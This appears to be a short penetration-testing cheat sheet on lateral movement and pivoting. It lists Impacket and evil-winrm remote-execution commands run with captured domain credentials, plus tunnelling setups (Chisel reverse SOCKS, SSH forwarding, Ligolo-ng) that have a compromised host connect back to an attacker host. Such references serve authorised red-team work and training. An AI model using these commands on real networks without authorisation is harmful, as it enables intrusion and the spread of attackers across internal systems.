# 19. Lateral Movement & Pivoting

## Windows lateral movement

`psexec.py domain/user:pass@<ip>
wmiexec.py domain/user:pass@<ip>
smbexec.py domain/user:pass@<ip>
evil-winrm -i <ip> -u user -p pass`

## Pivoting — Chisel

`# Attacker
chisel server -p 8000 --reverse

# Target
./chisel client <attacker>:8000 R:socks

# Then
proxychains nmap -sT -Pn <internal-ip>`

## Pivoting — SSH tunnels

`ssh -L 8080:127.0.0.1:80 user@pivot
ssh -D 1080 user@pivot`

## Pivoting — Ligolo-ng (modern)

`# Attacker
./proxy -selfcert

# Target
./agent -connect <attacker>:11601 -ignore-cert`